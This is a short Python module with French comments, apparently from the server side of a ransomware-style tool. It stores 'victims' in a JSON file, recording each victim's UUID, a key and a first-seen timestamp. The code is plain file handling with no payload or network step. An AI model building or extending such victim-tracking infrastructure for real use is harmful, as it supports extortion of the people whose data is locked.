"""
storage.py
----------

Gestion du stockage persistant des victimes côté serveur.

Fonctionnalités :
- charger le fichier victims.json
- sauvegarder les données
- enregistrer une nouvelle victime

Le fichier JSON a la structure :
{
    "uuid1": {"key": "...", "first_seen": "..."},
    "uuid2": {"key": "...", "first_seen": "..."}
}
"""

import json
from pathlib import Path
from datetime import datetime
from typing import Dict, Any


VICTIMS_FILE = Path("victims.json")


def load_victims() -> Dict[str, Any]:
    """
    Charge les victimes depuis victims.json.
    Retourne {} si le fichier n'existe pas ou est illisible.
    """
    if not VICTIMS_FILE.exists():
        return {}

    try:
        with open(VICTIMS_FILE, "r") as f:
            return json.load(f)
    except Exception:
        return {}


def save_victims(victims: Dict[str, Any]) -> None:
    """
    Sauvegarde le dictionnaire des victimes dans victims.json.
    """
    try:
        with open(VICTIMS_FILE, "w") as f:
            json.dump(victims, f, indent=4)
    except Exception as e:
        print(f"[ERROR] Impossible d'écrire dans {VICTIMS_FILE}: {e}")


def register_victim(uuid: str, key: str) -> None:
    """
    Ajoute ou met à jour une victime dans le fichier JSON.
    """
    victims = load_victims()

    if uuid not in victims:
        victims[uuid] = {
            "key": key,
            "first_seen": datetime.utcnow().isoformat()
        }
    else:
        victims[uuid]["key"] = key

    save_victims(victims)
